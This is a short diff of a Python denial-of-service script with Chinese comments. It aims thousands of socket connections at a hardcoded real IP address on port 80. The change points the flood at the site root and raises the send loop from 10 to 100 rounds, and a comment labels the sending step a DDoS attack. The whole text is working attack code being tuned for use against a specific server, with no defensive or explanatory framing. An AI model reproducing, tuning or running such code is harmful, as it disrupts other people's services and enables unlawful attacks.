@@ -4,7 +4,7 @@ import threading
 MAX_CONN = 10000  # 设置连接的数量
 PORT = 80  # 设置端口号
 HOST = "154.12.53.216"  # 设置IP地址
-PAGE = "/debug"
+PAGE = "/"
 buf = ("GET %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
@@ -29,7 +29,7 @@ def conn_thread():
 
 def send_thread():
     global socks
-    for i in range(10):
+    for i in range(100):
         for s in socks:
             try:
                 s.send(bytes("ddos", encoding='utf-8'))  # ddos攻击
